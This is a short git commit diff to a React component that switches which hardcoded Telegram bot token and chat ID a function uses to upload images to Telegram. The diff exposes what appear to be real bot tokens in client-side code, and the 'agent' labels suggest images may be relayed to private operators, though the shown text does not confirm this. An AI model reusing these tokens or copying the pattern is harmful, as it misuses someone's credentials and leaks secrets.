91fd06ac7b8b8c8e54acd146a2653d4314e56151
R.Abisheik <137792859+Abi-de-jo@users.noreply.github.com>
2024-12-11 23:10:16 +0530

    Update SecondComponent.jsx

--- botf/src/components/SecondComponent.jsx
+++ botf/src/components/SecondComponent.jsx
@@ -105,13 +105,13 @@ import axios from 'axios';
 
   
     try {
-      const TELEGRAM_BOT_TOKEN = '7712916176:AAF15UqOplv1hTdJVxILWoUOEefEKjGJOso';
-      const TELEGRAM_CHAT_ID = '1469627446' 
+      // const TELEGRAM_BOT_TOKEN = '7712916176:AAF15UqOplv1hTdJVxILWoUOEefEKjGJOso';
+      // const TELEGRAM_CHAT_ID = '1469627446' 
 
      //agent abi
 
-     // const TELEGRAM_BOT_TOKEN = '7869664541:AAFScFIX4Ve58y8IMKcYg6Vu3PEi__18zk8'; // SHAFII
-     //  const TELEGRAM_CHAT_ID = '7869664541';
+     const TELEGRAM_BOT_TOKEN = '7869664541:AAFScFIX4Ve58y8IMKcYg6Vu3PEi__18zk8';            // SHAFII
+      const TELEGRAM_CHAT_ID = '7869664541';
   
       const uploadImagesToTelegram = async (images, chatId, botToken) => {
         const uploadedImages = [];
